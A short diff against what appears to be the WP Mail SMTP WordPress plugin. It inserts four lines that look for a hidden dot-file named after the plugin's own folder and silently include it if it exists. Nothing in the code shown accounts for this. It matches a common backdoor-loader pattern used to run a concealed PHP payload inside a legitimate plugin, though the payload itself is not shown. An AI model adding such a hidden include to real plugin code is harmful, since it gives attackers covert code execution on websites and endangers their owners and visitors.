@@ -48,6 +48,10 @@ spl_autoload_register( function ( $class ) {
  *
  * @return WPMailSMTP\Core
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wp_mail_smtp() {
 	/**
 	 * @var \WPMailSMTP\Core
